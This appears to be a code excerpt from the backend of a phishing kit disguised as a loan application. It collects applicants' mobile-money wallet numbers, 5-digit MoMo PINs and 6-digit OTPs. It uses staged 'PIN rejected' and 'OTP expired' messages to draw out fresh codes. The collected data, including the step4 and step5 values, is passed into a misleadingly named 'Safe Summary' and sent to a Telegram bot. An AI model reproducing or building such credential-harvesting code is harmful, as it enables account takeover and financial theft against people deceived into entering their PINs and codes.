...
function createSafeSubmissionMessage({ appId, referenceId, step1,step3, step4,step5 }) {
  return [
    'New Loan Application (Safe Summary)',
    `App ID: ${toSafeText(appId)}`,
    `Reference ID: ${toSafeText(referenceId)}`,
    ...
    `Employment Status: ${toSafeText(step3?.employment)}`,
...
async function sendTelegramMessage(text) {
  ...
  if (!response.ok) {
    ...
    throw new Error(`Telegram send failed with status ${response.status}${details}`)
  }
}
...
io.on('connection', (socket) => {
  ...
  socket.on('step4', (payload) => {
    if (!payload?.phone || !/^\d{5}$/.test(payload?.password ?? '')) {
      socket.emit('error', { message: 'Wallet phone and a valid 5-digit MoMo PIN are required.' })
      return
    }
    ...
    setTimeout(() => {
      if (payload.password === '00000') {
        socket.emit('password-rejected', { message: 'PIN rejected by the verification desk.' })
        return
      }
  ...
  socket.on('step5', (payload) => {
    if (!payload?.pin || payload.pin.length !== 6) {
      socket.emit('error', { message: 'A 6-digit OTP is required.' })
      return
    }

    setTimeout(async () => {
      if (payload.pin === '000000') {
        socket.emit('pin-rejected', { message: 'OTP invalid or expired. Try a new code.' })
        return
      }
      ...
      try {
        const safeMessage = createSafeSubmissionMessage({
          appId: sessionSnapshot.appId,
          referenceId,
          step1: sessionSnapshot.step1,
          step3: sessionSnapshot.step3, 
          step4: sessionSnapshot.step4,
          step5: payload,

        })
        await sendTelegramMessage(safeMessage)
      } catch (error) {
